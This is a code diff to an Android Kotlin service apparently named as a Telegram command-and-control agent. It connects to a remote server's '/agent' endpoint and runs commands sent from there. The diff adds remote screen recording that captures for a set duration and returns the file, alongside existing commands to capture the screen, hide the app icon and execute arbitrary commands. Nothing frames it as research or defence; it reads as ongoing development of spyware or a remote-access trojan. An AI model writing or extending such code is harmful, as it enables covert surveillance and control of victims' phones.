@@ -188,7 +188,6 @@ class TelegramC2Service : Service() {
             socket = null
             connected = false
 
-            // ⚠️ namespace /agent via URI path
             val base = serverUrl.trimEnd('/')
             val uri = URI("$base/agent")
 
@@ -288,13 +287,41 @@ class TelegramC2Service : Service() {
                     if (s == null) JSONObject().put("error", "projection_not_ready")
                     else s.capture()
                 }
+
                 "screen_record" -> {
-                    val p = projection
-                    if (p == null) JSONObject().put("error", "projection_not_ready")
-                    else ScreenRecorder.start(this, p, args.optInt("duration", 20))
+                    val s = captureSession
+                    if (s == null) {
+                        JSONObject().put("error", "projection_not_ready")
+                    } else {
+                        val dur = args.optInt("duration", 20).coerceIn(5, 120)
+                        val startRes = s.startRecording(dur)
+                        if (startRes.has("error")) {
+                            startRes
+                        } else {
+                            // Wait for the auto-stop timer inside the session
+                            delay((dur + 2) * 1000L)
+                            val stopRes = s.stopRecording()
+                            if (stopRes.has("error")) stopRes
+                            else {
+                                JSONObject()
+                                    .put("ok", true)
+                                    .put("path", stopRes.optString("path"))
+                                    .put("size", stopRes.optLong("size"))
+                                    .put("filename", stopRes.optString("filename"))
+                            }
+                        }
+                    }
                 }
+
+                "screen_record_stop" -> {
+                    val s = captureSession
+                    if (s == null) JSONObject().put("error", "projection_not_ready")
+                    else s.stopRecording()
+                }
+
                 "hide_icon" -> IconHider.hide(this)
                 "show_icon" -> IconHider.show(this)
+
                 else -> CommandExecutor.run(this, type, args)
             }
         } catch (e: Exception) {
